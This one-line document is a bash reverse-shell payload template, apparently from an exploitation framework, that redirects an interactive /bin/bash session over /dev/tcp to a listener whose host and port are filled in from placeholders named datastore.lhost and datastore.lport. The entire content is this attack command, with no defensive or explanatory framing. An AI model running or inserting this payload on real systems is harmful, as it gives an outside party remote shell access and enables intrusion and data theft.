/bin/bash -c "/bin/bash &>/dev/tcp/{{datastore.lhost}}/{{datastore.lport}} <&1" 2>&1
